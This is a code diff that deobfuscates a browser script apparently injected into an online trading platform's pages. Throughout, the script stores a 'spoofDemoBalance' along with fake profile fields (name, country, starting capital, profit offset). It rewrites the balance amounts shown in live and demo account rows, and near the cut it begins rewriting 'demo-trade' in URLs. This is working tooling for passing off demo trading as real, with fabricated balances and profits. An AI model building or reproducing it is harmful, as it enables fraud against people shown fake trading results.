-      const _x = localStorage[_0[108]](_r);
-      _23 = function () {
-        return 318179 ^ 318187;
-      }();
-      if (_x) {
-        var _24 = function (s, h) {
-          return s ^ h;
-        }(385058, 385066);
-        const _y = JSON[_0[109]](_x);
-        _24 = (491213 ^ 491212) + (896199 ^ 896193);
-        if (_y && typeof _y === _0[103][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-          var _25 = function (s, h) {
-            return s + h;
-          }(123197 ^ 123197, 112982 ^ 112991);
-          const _z = _1nb(_y);
-          _25 = function () {
-            return 734601 ^ 734607;
-          }();
-          if (_0[110][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) in _y || _0[111][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) in _y || _0[112][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) in _y || _0[113][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) in _y || _0[114][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) in _y || _0[115][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) in _y) {
-            localStorage[_0[116]](_r, JSON[_0[117]](_z));
+      const raw = localStorage.getItem(DEMO_STORAGE_KEY);
+      if (raw) {
+        const parsed = JSON.parse(raw);
+        if (parsed && typeof parsed === 'object') {
+          const clean = sanitizePersistedConfig(parsed);
+          if (
+            'customName' in parsed ||
+            'country' in parsed ||
+            'countryFlag' in parsed ||
+            'startingCapital' in parsed ||
+            'profitOffset' in parsed ||
+            'customAvatar' in parsed
+          ) {
+            localStorage.setItem(DEMO_STORAGE_KEY, JSON.stringify(clean));
           }
-          return _z;
+          return clean;
         }
       }
-      var _26 = function (s, h) {
-        return s ^ h;
-      }(156820, 156823);
-      const _1a = localStorage[_0[108]](_t);
-      _26 = function () {
-        return _0[118];
-      }();
-      if (_1a) {
-        var _27 = function (s, h) {
-          return s + h;
-        }(793401 ^ 793401, 638061 ^ 638058);
-        const _1b = JSON[_0[109]](_1a);
-        _27 = function () {
-          return 561190 ^ 561191;
-        }();
-        if (_1b && typeof _1b === _0[103][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-          var _28 = _0[119];
-          const _1c = {
-            spoofDemoBalance: _1b[_0[104]] ?? null,
-            transactions: Array[_0[105]](_1b[_0[106]]) ? _1b[_0[106]] : undefined
+
+      const legacyRaw = localStorage.getItem(DEMO_LEGACY_STORAGE_KEY);
+      if (legacyRaw) {
+        const legacy = JSON.parse(legacyRaw);
+        if (legacy && typeof legacy === 'object') {
+          const cleanLegacy = {
+            spoofDemoBalance: legacy.spoofDemoBalance ?? null,
+            transactions: Array.isArray(legacy.transactions) ? legacy.transactions : undefined
           };
-          _28 = function () {
-            return 938873 ^ 938879;
-          }();
-          localStorage[_0[116]](_r, JSON[_0[117]](_1c));
-          return _1c;
+          localStorage.setItem(DEMO_STORAGE_KEY, JSON.stringify(cleanLegacy));
+          return cleanLegacy;
         }
       }
     } catch (e) {}
     return null;
   }
-  function _1nd(cfg) {
+
+  function saveDemoConfig(cfg) {
     try {
-      localStorage[_0[116]](_r, JSON[_0[117]](_1nb(cfg)));
+      localStorage.setItem(DEMO_STORAGE_KEY, JSON.stringify(sanitizePersistedConfig(cfg)));
     } catch (e) {}
   }
-  var _29 = function (s, h) {
-    return s ^ h;
-  }(567848, 567850);
-  const _1d = Object[_0[120]]({}, _v, _1nc() || {});
-  _29 = (283296 ^ 283298) + (202740 ^ 202739);
-  function _1ne(num) {
-    return _0[121] + Number(num || 844926 ^ 844926)[_0[122]](_0[123][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), {
-      minimumFractionDigits: 457171 ^ 457169,
-      maximumFractionDigits: 351525 ^ 351527
+
+  const demoPanelConfig = Object.assign({}, defaultDemoConfig, loadDemoConfig() || {});
+
+  function formatUsd(num) {
+    return '$' + Number(num || 0).toLocaleString('en-US', {
+      minimumFractionDigits: 2,
+      maximumFractionDigits: 2
     });
   }
-  function _1nf() {
+
+  function syncLiveConfigFromStorage() {
     try {
-      var _30 = function (s, h) {
-        return s + h;
-      }(301759 ^ 301756, 150580 ^ 150580);
-      const _1e = function (s, h) {
-        return s === h;
-      }(localStorage[_0[108]](_0[124][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])), _0[125]);
-      _30 = function () {
-        return 464674 ^ 464673;
-      }();
-      var _31 = function (s, h) {
-        return s ^ h;
-      }(861703, 861703);
-      const _1f = localStorage[_0[108]](_0[126][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _31 = (975299 ^ 975298) + (581384 ^ 581384);
-      if (_1e) {
-        _1d[_0[104]] = null;
-      } else if (_1f !== null && _1f[_0[127]]() !== _0[3] && Number[_0[128]](parseFloat(_1f))) {
-        _1d[_0[104]] = _1f[_0[127]]();
-      } else if (_1d[_0[104]] !== null && _1d[_0[104]] !== undefined && String(_1d[_0[104]])[_0[127]]() !== _0[3] && Number[_0[128]](parseFloat(String(_1d[_0[104]])))) {
-        _1d[_0[104]] = String(_1d[_0[104]])[_0[127]]();
+      const isDemoReset = localStorage.getItem('demoBalanceReset') === '1';
+      const storedDemo = localStorage.getItem('demoBalance');
+
+      if (isDemoReset) {
+        demoPanelConfig.spoofDemoBalance = null;
+      } else if (storedDemo !== null && storedDemo.trim() !== '' && Number.isFinite(parseFloat(storedDemo))) {
+        demoPanelConfig.spoofDemoBalance = storedDemo.trim();
+      } else if (
+        demoPanelConfig.spoofDemoBalance !== null &&
+        demoPanelConfig.spoofDemoBalance !== undefined &&
+        String(demoPanelConfig.spoofDemoBalance).trim() !== '' &&
+        Number.isFinite(parseFloat(String(demoPanelConfig.spoofDemoBalance)))
+      ) {
+        demoPanelConfig.spoofDemoBalance = String(demoPanelConfig.spoofDemoBalance).trim();
       } else {
-        _1d[_0[104]] = null;
+        demoPanelConfig.spoofDemoBalance = null;
       }
-      _1nd(_1d);
+
+      saveDemoConfig(demoPanelConfig);
     } catch (e) {}
   }
-  function _1ng(container, formattedAmount, saveAsDemo) {
-    if (!container) return ![];
-    var _32 = function (s, h) {
-      return s + h;
-    }(597437 ^ 597437, 414170 ^ 414163);
-    const _1g = [...container[_0[12]](_0[129][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))][_0[130]](el => {
-      if (el[_0[21]](_0[131][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) return ![];
-      const t = (el[_0[38]] || _0[3])[_0[127]]();
-      if (!t || el[_0[132]][_0[9]] > (306988 ^ 306988)) return ![];
-      if (/limit|account|deposit|refresh/i[_0[133]](t)) return ![];
-      return /^\$\s*[\d,\s\u00a0]+(?:\.\d+)?$/[_0[133]](t) || /^\d[\d,\s\u00a0]*(\.\d+)?$/[_0[133]](t);
+
+  function setFirstDollarText(container, formattedAmount, saveAsDemo) {
+    if (!container) return false;
+    const balEls = [...container.querySelectorAll('b.YnoT0, b[class*="YnoT0"], b, strong, [class*="balance"], [class*="amount"], [class*="money"], span, div')].filter(el => {
+      if (el.closest('.qx-hide-orig-el')) return false;
+      const t = (el.textContent || '').trim();
+      if (!t || el.children.length > 0) return false;
+      if (/limit|account|deposit|refresh/i.test(t)) return false;
+      return /^\$\s*[\d,\s\u00a0]+(?:\.\d+)?$/.test(t) || /^\d[\d,\s\u00a0]*(\.\d+)?$/.test(t);
     });
-    _32 = function () {
-      return _0[134];
-    }();
-    if (_1g[_0[9]] > (762390 ^ 762390)) {
-      var _33 = function (s, h) {
-        return s ^ h;
-      }(266206, 266203);
-      const _1h = _1g[770004 ^ 770004];
-      _33 = function () {
-        return _0[135];
-      }();
+
+    if (balEls.length > 0) {
+      const targetEl = balEls[0];
       if (saveAsDemo) {
-        if (!_1h[_0[136]][_0[137]]) {
-          _1h[_0[136]][_0[137]] = _1h[_0[38]] || _0[3];
+        if (!targetEl.dataset.qxOrigDemoText) {
+          targetEl.dataset.qxOrigDemoText = targetEl.textContent || '';
         }
-        _1h[_0[138]](_0[139][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[125]);
+        targetEl.setAttribute('data-qx-demo-balance', '1');
       } else {
-        if (!_1h[_0[136]][_0[140]]) {
-          _1h[_0[136]][_0[140]] = _1h[_0[38]] || _0[3];
+        if (!targetEl.dataset.qxOrigLiveText) {
+          targetEl.dataset.qxOrigLiveText = targetEl.textContent || '';
         }
-        _1h[_0[138]](_0[141][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[125]);
+        targetEl.setAttribute('data-qx-synced-live-balance', '1');
       }
-      if (_1h[_0[38]][_0[127]]() !== formattedAmount) {
-        _1h[_0[38]] = formattedAmount;
+      if (targetEl.textContent.trim() !== formattedAmount) {
+        targetEl.textContent = formattedAmount;
       }
-      return !![];
+      return true;
     }
-    var _34 = _0[142];
-    const tw = document[_0[143]](container, NodeFilter[_0[144]], null, ![]);
-    _34 = function () {
-      return _0[142];
-    }();
-    var _35 = _0[145];
+
+    const tw = document.createTreeWalker(container, NodeFilter.SHOW_TEXT, null, false);
     let tn;
-    _35 = function () {
-      return _0[145];
-    }();
-    while (tn = tw[_0[146]]()) {
-      if (tn[_0[147]] && /\$\s*[\d,\s\u00a0]+(?:\.\d+)?/[_0[133]](tn[_0[147]])) {
-        if (tn[_0[148]] && /limit/i[_0[133]](tn[_0[148]][_0[38]] || _0[3]) && !/^\$\s*[\d,\s\u00a0]+(?:\.\d+)?$/[_0[133]](tn[_0[147]][_0[127]]())) {
+    while ((tn = tw.nextNode())) {
+      if (tn.nodeValue && /\$\s*[\d,\s\u00a0]+(?:\.\d+)?/.test(tn.nodeValue)) {
+        if (tn.parentElement && /limit/i.test(tn.parentElement.textContent || '') && !/^\$\s*[\d,\s\u00a0]+(?:\.\d+)?$/.test(tn.nodeValue.trim())) {
           continue;
         }
-        if (saveAsDemo && tn[_0[148]]) {
-          if (!tn[_0[148]][_0[136]][_0[137]]) {
-            tn[_0[148]][_0[136]][_0[137]] = tn[_0[147]];
+        if (saveAsDemo && tn.parentElement) {
+          if (!tn.parentElement.dataset.qxOrigDemoText) {
+            tn.parentElement.dataset.qxOrigDemoText = tn.nodeValue;
           }
-          tn[_0[148]][_0[138]](_0[139][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[125]);
-        } else if (!saveAsDemo && tn[_0[148]]) {
-          if (!tn[_0[148]][_0[136]][_0[140]]) {
-            tn[_0[148]][_0[136]][_0[140]] = tn[_0[147]];
+          tn.parentElement.setAttribute('data-qx-demo-balance', '1');
+        } else if (!saveAsDemo && tn.parentElement) {
+          if (!tn.parentElement.dataset.qxOrigLiveText) {
+            tn.parentElement.dataset.qxOrigLiveText = tn.nodeValue;
           }
-          tn[_0[148]][_0[138]](_0[141][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[125]);
+          tn.parentElement.setAttribute('data-qx-synced-live-balance', '1');
         }
-        if (tn[_0[147]][_0[127]]() !== formattedAmount) {
-          tn[_0[147]] = formattedAmount;
+        if (tn.nodeValue.trim() !== formattedAmount) {
+          tn.nodeValue = formattedAmount;
         }
-        return !![];
+        return true;
       }
     }
-    return ![];
+    return false;
   }
-  function _1nh(textNode) {
-    var _36 = _0[149];
-    let cur = textNode[_0[148]];
-    _36 = (972462 ^ 972458) + (398103 ^ 398099);
-    var _37 = function (s, h) {
-      return s + h;
-    }(247000 ^ 247000, 826371 ^ 826369);
-    let _3u = textNode[_0[148]];
-    _37 = function () {
-      return _0[150];
-    }();
-    for (let i = function (s, h) {
-      return s ^ h;
-    }(998342, 998342); i < (638733 ^ 638725) && cur && cur !== document[_0[151]]; i++) {
-      var _38 = _0[152];
-      const txt = cur[_0[38]] || _0[3];
-      _38 = function () {
-        return _0[152];
-      }();
-      var _39 = function (s, h) {
-        return s + h;
-      }(321531 ^ 321529, 230643 ^ 230644);
-      const _6h = /live\s+account/i[_0[133]](txt);
-      _39 = (699604 ^ 699607) + (411872 ^ 411873);
-      var _40 = function (s, h) {
-        return s ^ h;
-      }(731960, 731962);
-      const _6i = /demo\s+account/i[_0[133]](txt);
-      _40 = function () {
-        return _0[153];
-      }();
-      if (_6h && _6i) break;
-      if (_6h || _6i) {
-        _3u = cur;
-        var _41 = function (s, h) {
-          return s + h;
-        }(754368 ^ 754370, 663701 ^ 663702);
-        const _6j = cur[_0[154]] ? cur[_0[154]](_0[155][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) : _0[3];
-        _41 = (930536 ^ 930541) + (638150 ^ 638151);
-        if (cur[_0[156]] === _0[157][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) || _6j === _0[158][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) || _6j === _0[159][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) break;
+
+  function findSingleAccountRow(textNode) {
+    let cur = textNode.parentElement;
+    let best = textNode.parentElement;
+    for (let i = 0; i < 8 && cur && cur !== document.body; i++) {
+      const txt = cur.textContent || '';
+      const hasLive = /live\s+account/i.test(txt);
+      const hasDemo = /demo\s+account/i.test(txt);
+      if (hasLive && hasDemo) break;
+      if (hasLive || hasDemo) {
+        best = cur;
+        const role = cur.getAttribute ? cur.getAttribute('role') : '';
+        if (cur.tagName === 'LI' || role === 'menuitem' || role === 'option') break;
       }
-      cur = cur[_0[148]];
+      cur = cur.parentElement;
     }
-    return _3u;
+    return best;
   }
-  function _1ni() {
-    var _42 = _0[160];
-    const _6k = [];
-    _42 = function () {
-      return _0[160];
-    }();
-    var _43 = function (s, h) {
-      return s ^ h;
-    }(864841, 864847);
-    const _6l = el => {
-      if (el && el[_0[161]] && !el[_0[21]]?.(_0[162][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) && !_6k[_0[18]](el)) {
-        _6k[_0[19]](el);
+
+  function findAccountDropdownScopes() {
+    const scopes = [];
+    const addScope = (el) => {
+      if (el && el.isConnected && !el.closest?.('#settingsPopup, #qxAnalyticsModal, #qxTxModal') && !scopes.includes(el)) {
+        scopes.push(el);
       }
     };
-    _43 = function () {
-      return _0[163];
-    }();
-    _1n8(_0[164][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](_6l);
-    _1n8(_0[166][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](li => _6l(li[_0[148]]));
-    _1n8(_0[27][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](lbl => {
-      var _44 = _0[167];
-      const txt = lbl[_0[38]] || _0[3];
-      _44 = function () {
-        return _0[167];
-      }();
-      if (/live\s+account/i[_0[133]](txt) && lbl[_0[148]]) {
-        _6l(lbl[_0[148]]);
+    queryAllDeep('.grOBD, .p0Ijl, ul[class*="account"]').forEach(addScope);
+    queryAllDeep('li.RDtBn, li[class*="RdTBn"]').forEach(li => addScope(li.parentElement));
+    queryAllDeep('label').forEach(lbl => {
+      const txt = lbl.textContent || '';
+      if (/live\s+account/i.test(txt) && lbl.parentElement) {
+        addScope(lbl.parentElement);
       }
     });
-    if (_6k[_0[9]] === (704392 ^ 704392)) {
-      _1n8(_0[168][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[165]](el => {
-        if (el[_0[21]]?.(_0[162][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) return;
-        var _45 = _0[169];
-        const txt = el[_0[38]] || _0[3];
-        _45 = function () {
-          return 439472 ^ 439472;
-        }();
-        if (txt[_0[9]] > (550332 ^ 550326) && txt[_0[9]] < (977530 ^ 977094) && /live\s+account/i[_0[133]](txt) && /demo\s+account/i[_0[133]](txt)) {
-          _6l(el);
+    if (scopes.length === 0) {
+      queryAllDeep('ul, [role="menu"], [class*="dropdown"], [class*="menu"], [class*="popover"], div').forEach(el => {
+        if (el.closest?.('#settingsPopup, #qxAnalyticsModal, #qxTxModal')) return;
+        const txt = el.textContent || '';
+        if (txt.length > 10 && txt.length < 700 && /live\s+account/i.test(txt) && /demo\s+account/i.test(txt)) {
+          addScope(el);
         }
       });
     }
-    return _6k;
+    return scopes;
   }
-  function _1nj() {
-    var _46 = function (s, h) {
-      return s ^ h;
-    }(924016, 924018);
-    const _b0 = document[_0[29]](_0[170][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _46 = (144325 ^ 144321) + (272053 ^ 272048);
-    if (_b0) {
-      var _47 = function (s, h) {
-        return s ^ h;
-      }(901744, 901752);
-      const sr = _b0[_0[16]] || _b0[_0[17]];
-      _47 = function () {
-        return 882608 ^ 882608;
-      }();
-      var _48 = function (s, h) {
-        return s ^ h;
-      }(264849, 264851);
-      const _b1 = sr ? sr[_0[29]](_0[171][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) : null;
-      _48 = (270247 ^ 270240) + (286210 ^ 286214);
-      var _49 = function (s, h) {
-        return s ^ h;
-      }(854097, 854099);
-      const raw = _b1 ? _b1[_0[38]] : sr ? sr[_0[38]] : _b0[_0[38]];
-      _49 = function () {
-        return _0[172];
-      }();
-      var _50 = _0[173];
-      const m = (raw || _0[3])[_0[174]](/\$\s*([\d,\s\u00a0]+(?:\.\d+)?)/);
-      _50 = (150537 ^ 150538) + (836166 ^ 836163);
+
+  function getHeaderLiveBalanceValue() {
+    const trigger = document.querySelector('qx-usermenu-trigger');
+    if (trigger) {
+      const sr = trigger.shadowRoot || trigger.__zeroxShadowRoot;
+      const balEl = sr ? sr.querySelector('.balance, [class*="balance"]') : null;
+      const raw = balEl ? balEl.textContent : (sr ? sr.textContent : trigger.textContent);
+      const m = (raw || '').match(/\$\s*([\d,\s\u00a0]+(?:\.\d+)?)/);
       if (m) {
-        var _51 = function (s, h) {
-          return s ^ h;
-        }(826790, 826799);
-        const val = parseFloat(m[866884 ^ 866885][_0[50]](/[\s\u00a0,]/g, _0[3]));
-        _51 = function () {
-          return 204863 ^ 204854;
-        }();
-        if (Number[_0[128]](val) && val > (663905 ^ 663905) && val < 100000000) return val;
+        const val = parseFloat(m[1].replace(/[\s\u00a0,]/g, ''));
+        if (Number.isFinite(val) && val > 0 && val < 100000000) return val;
       }
     }
-    var _52 = _0[175];
-    const _en = _1n8(_0[176][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _52 = function () {
-      return 776744 ^ 776745;
-    }();
-    for (const el of _en) {
-      if (el[_0[21]]?.(_0[177][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))) continue;
-      if (el[_0[136]] && el[_0[136]][_0[178]] === _0[125]) continue;
-      var _53 = function (s, h) {
-        return s + h;
-      }(317490 ^ 317488, 921434 ^ 921439);
-      const _eo = (el[_0[38]] || _0[3])[_0[127]]();
-      _53 = (359051 ^ 359048) + (426045 ^ 426043);
-      if (!_eo[_0[18]](_0[121])) continue;
-      if (/live\s+account|demo\s+account|daily\s+limit/i[_0[133]](_eo)) continue;
-      var _54 = function (s, h) {
-        return s + h;
-      }(412440 ^ 412445, 844272 ^ 844281);
-      const _ep = _eo[_0[174]](/\$\s*([\d,\s\u00a0]+(?:\.\d+)?)/);
-      _54 = (200270 ^ 200270) + (508179 ^ 508176);
-      if (!_ep) continue;
-      var _55 = function (s, h) {
-        return s + h;
-      }(219879 ^ 219886, 886306 ^ 886309);
-      const num = parseFloat(_ep[975179 ^ 975178][_0[50]](/[\s\u00a0,]/g, _0[3]));
-      _55 = function () {
-        return _0[179];
-      }();
-      if (Number[_0[128]](num) && num > (969717 ^ 969717) && num < 100000000) {
+
+    const headerCandidates = queryAllDeep('header .zt1hG, header .v2KPX, .zt1hG, .v2KPX, header div, header span');
+    for (const el of headerCandidates) {
+      if (el.closest?.('#settingsPopup, #qxAnalyticsModal, #qxTxModal, ul, [role="menu"]')) continue;
+      if (el.dataset && el.dataset.qxSyncedLiveBalance === '1') continue;
+      const text = (el.textContent || '').trim();
+      if (!text.includes('$')) continue;
+      if (/live\s+account|demo\s+account|daily\s+limit/i.test(text)) continue;
+      const match = text.match(/\$\s*([\d,\s\u00a0]+(?:\.\d+)?)/);
+      if (!match) continue;
+      const num = parseFloat(match[1].replace(/[\s\u00a0,]/g, ''));
+      if (Number.isFinite(num) && num > 0 && num < 100000000) {
         return num;
       }
     }
-    var _56 = function (s, h) {
-      return s ^ h;
-    }(554793, 554797);
-    const _gi = _1nm();
-    _56 = function () {
-      return _0[180];
-    }();
-    return Number[_0[128]](_gi) && _gi > (267478 ^ 267478) ? _gi : null;
+
+    const fallback = getBalance();
+    return Number.isFinite(fallback) && fallback > 0 ? fallback : null;
   }
-  function _1nk() {
-    var _57 = function (s, h) {
-      return s ^ h;
-    }(184772, 184775);
-    const _gj = _1nj();
-    _57 = function () {
-      return 175860 ^ 175863;
-    }();
-    if (_gj === null) return;
-    var _58 = function (s, h) {
-      return s ^ h;
-    }(794598, 794598);
-    const _gk = _1ne(_gj);
-    _58 = function () {
-      return _0[181];
-    }();
-    for (const _gl of _1n7()) {
-      var _59 = _0[182];
-      const _gm = document[_0[143]](_gl, NodeFilter[_0[144]], null, ![]);
-      _59 = function () {
-        return _0[182];
-      }();
-      var _60 = function (s, h) {
-        return s + h;
-      }(861038 ^ 861031, 979112 ^ 979105);
-      let _gn;
-      _60 = function () {
-        return 912346 ^ 912349;
-      }();
-      while (_gn = _gm[_0[146]]()) {
-        var _61 = function (s, h) {
-          return s ^ h;
-        }(388308, 388304);
-        const t = (_gn[_0[147]] || _0[3])[_0[127]]();
-        _61 = (452702 ^ 452697) + (716556 ^ 716549);
-        if (/^live\s+account$/i[_0[133]](t) && _gn[_0[148]]) {
-          var _62 = function (s, h) {
-            return s ^ h;
-          }(218043, 218043);
-          const row = _1nh(_gn);
-          _62 = function () {
-            return 369948 ^ 369940;
-          }();
-          if (row && !/demo\s+account/i[_0[133]](row[_0[38]] || _0[3])) {
-            _1ng(row, _gk, ![]);
+
+  function syncLiveBalanceWithDropdown() {
+    const liveBalanceNum = getHeaderLiveBalanceValue();
+    if (liveBalanceNum === null) return;
+
+    const formattedLive = formatUsd(liveBalanceNum);
+
+    for (const root of getAllRoots()) {
+      const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
+      let node;
+      while ((node = walker.nextNode())) {
+        const t = (node.nodeValue || '').trim();
+        if (/^live\s+account$/i.test(t) && node.parentElement) {
+          const row = findSingleAccountRow(node);
+          if (row && !/demo\s+account/i.test(row.textContent || '')) {
+            setFirstDollarText(row, formattedLive, false);
           }
         }
       }
     }
-    var _63 = function (s, h) {
-      return s ^ h;
-    }(928174, 928166);
-    const _ig = _1ni();
-    _63 = function () {
-      return _0[183];
-    }();
-    _ig[_0[165]](dropdownScope => {
-      var _64 = function (s, h) {
-        return s + h;
-      }(972641 ^ 972647, 770416 ^ 770418);
-      const _ih = [];
-      _64 = function () {
-        return _0[184];
-      }();
-      var _65 = function (s, h) {
-        return s + h;
-      }(656149 ^ 656150, 610861 ^ 610861);
-      const _ii = document[_0[143]](dropdownScope, NodeFilter[_0[144]], null, ![]);
-      _65 = function () {
-        return _0[185];
-      }();
-      var _66 = _0[186];
-      let _ij;
-      _66 = function () {
-        return _0[186];
-      }();
-      while (_ij = _ii[_0[146]]()) {
-        var _67 = function (s, h) {
-          return s ^ h;
-        }(243314, 243323);
-        const t = (_ij[_0[147]] || _0[3])[_0[127]]();
-        _67 = function () {
-          return 272303 ^ 272300;
-        }();
-        if (/^(live|demo)\s+account$/i[_0[133]](t) && _ij[_0[148]]) {
-          _ih[_0[19]](_ij);
+
+    const scopes = findAccountDropdownScopes();
+    scopes.forEach(dropdownScope => {
+      const labelNodes = [];
+      const walker = document.createTreeWalker(dropdownScope, NodeFilter.SHOW_TEXT, null, false);
+      let node;
+      while ((node = walker.nextNode())) {
+        const t = (node.nodeValue || '').trim();
+        if (/^(live|demo)\s+account$/i.test(t) && node.parentElement) {
+          labelNodes.push(node);
         }
       }
-      if (_ih[_0[9]] >= (438864 ^ 438866)) {
-        _ih[_0[165]](textNode => {
-          var _68 = _0[187];
-          const row = _1nh(textNode);
-          _68 = (601792 ^ 601795) + (118666 ^ 118670);
-          var _69 = function (s, h) {
-            return s ^ h;
-          }(792011, 792014);
-          const _kc = row ? row[_0[38]] || _0[3] : _0[3];
-          _69 = (535289 ^ 535290) + (353928 ^ 353933);
-          var _70 = _0[188];
-          const _kd = /live\s+account/i[_0[133]](_kc);
-          _70 = (542854 ^ 542849) + (583549 ^ 583540);
-          var _71 = function (s, h) {
-            return s + h;
-          }(301411 ^ 301413, 981760 ^ 981765);
-          const _ke = /demo\s+account/i[_0[133]](_kc);
-          _71 = (780806 ^ 780815) + (447313 ^ 447312);
-          if (_kd && !_ke && row) {
-            _1ng(row, _gk, ![]);
+
+      if (labelNodes.length >= 2) {
+        labelNodes.forEach(textNode => {
+          const row = findSingleAccountRow(textNode);
+          const rowText = row ? (row.textContent || '') : '';
+          const hasLiveHint = /live\s+account/i.test(rowText);
+          const hasDemoHint = /demo\s+account/i.test(rowText);
+          if (hasLiveHint && !hasDemoHint && row) {
+            setFirstDollarText(row, formattedLive, false);
           }
         });
       }
     });
   }
-  function _1nl() {
-    _1nf();
-    var _72 = function (s, h) {
-      return s ^ h;
-    }(484351, 484343);
-    const _kf = function (s, h) {
-      return s === h;
-    }(localStorage[_0[108]](_0[124][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])), _0[125]);
-    _72 = function () {
-      return _0[189];
-    }();
-    var _73 = function (s, h) {
-      return s ^ h;
-    }(985189, 985197);
-    const _kg = localStorage[_0[108]](_0[126][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-    _73 = (164746 ^ 164744) + (253769 ^ 253769);
-    var _74 = _0[190];
-    const _kh = !_kf ? _kg !== null && _kg[_0[127]]() !== _0[3] ? _kg[_0[127]]() : _1d[_0[104]] : null;
-    _74 = function () {
-      return _0[190];
-    }();
-    var _75 = _0[191];
-    const _ki = _kh !== null && _kh !== undefined && String(_kh)[_0[127]]() !== _0[3] ? parseFloat(String(_kh)) : NaN;
-    _75 = (691833 ^ 691837) + (571192 ^ 571193);
-    var _76 = function (s, h) {
-      return s + h;
-    }(121775 ^ 121770, 275038 ^ 275036);
-    const _kj = Number[_0[128]](_ki) && _ki >= (309519 ^ 309519) ? _ki : _u;
-    _76 = function () {
-      return _0[192];
-    }();
-    var _77 = _0[193];
-    const _kk = _1ne(_kj);
-    _77 = function () {
-      return 974239 ^ 974234;
-    }();
-    for (const _kl of _1n7()) {
-      var _78 = function (s, h) {
-        return s + h;
-      }(638815 ^ 638808, 522622 ^ 522619);
-      const _km = document[_0[143]](_kl, NodeFilter[_0[144]], null, ![]);
-      _78 = function () {
-        return 111856 ^ 111858;
-      }();
-      var _79 = _0[194];
-      let _kn;
-      _79 = (720205 ^ 720206) + (966484 ^ 966481);
-      while (_kn = _km[_0[146]]()) {
-        var _80 = function (s, h) {
-          return s ^ h;
-        }(661523, 661521);
-        const t = (_kn[_0[147]] || _0[3])[_0[127]]();
-        _80 = (332738 ^ 332746) + (937360 ^ 937362);
-        if (/^demo\s+account$/i[_0[133]](t) && _kn[_0[148]]) {
-          var _81 = _0[195];
-          const row = _1nh(_kn);
-          _81 = function () {
-            return 497277 ^ 497273;
-          }();
-          if (row && !/live\s+account/i[_0[133]](row[_0[38]] || _0[3])) {
-            _1ng(row, _kk, !![]);
+
+  function fixDemoAccountBalance() {
+    syncLiveConfigFromStorage();
+
+    const isDemoReset = localStorage.getItem('demoBalanceReset') === '1';
+    const storedDemo = localStorage.getItem('demoBalance');
+    const rawDemoStr = !isDemoReset
+      ? ((storedDemo !== null && storedDemo.trim() !== '') ? storedDemo.trim() : demoPanelConfig.spoofDemoBalance)
+      : null;
+    const parsedDemo = rawDemoStr !== null && rawDemoStr !== undefined && String(rawDemoStr).trim() !== ''
+      ? parseFloat(String(rawDemoStr))
+      : NaN;
+    const demoNum = Number.isFinite(parsedDemo) && parsedDemo >= 0 ? parsedDemo : DEFAULT_DEMO_BALANCE;
+    const formattedDemo = formatUsd(demoNum);
+
+    for (const root of getAllRoots()) {
+      const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
+      let node;
+      while ((node = walker.nextNode())) {
+        const t = (node.nodeValue || '').trim();
+        if (/^demo\s+account$/i.test(t) && node.parentElement) {
+          const row = findSingleAccountRow(node);
+          if (row && !/live\s+account/i.test(row.textContent || '')) {
+            setFirstDollarText(row, formattedDemo, true);
           }
         }
       }
     }
   }
-  if (!window[_0[196]]) {
-    window[_0[196]] = function () {
-      return !![];
-    }();
-    [_0[197][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[198][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), _0[199][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])][_0[165]](evtName => {
-      window[_0[200]](evtName, () => {
-        _1nl();
-        _1nk();
+
+  if (!window.qxDemoBalanceEventsBound) {
+    window.qxDemoBalanceEventsBound = true;
+    ['qx:demo-balance-updated', 'qx:demo-balance-reset', 'qx:transactions-updated'].forEach(evtName => {
+      window.addEventListener(evtName, () => {
+        fixDemoAccountBalance();
+        syncLiveBalanceWithDropdown();
       });
     });
   }
-  var _82 = function (s, h) {
-    return s ^ h;
-  }(930442, 930440);
-  const _mg = _0[201][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-  _82 = (892822 ^ 892822) + (898207 ^ 898204);
-  var _83 = function (s, h) {
-    return s ^ h;
-  }(431754, 431757);
-  const _mh = rawUrl => {
-    if (!rawUrl || typeof rawUrl !== _0[46][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) return rawUrl;
-    return rawUrl[_0[50]](/demo-trade/gi, _0[202][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
+
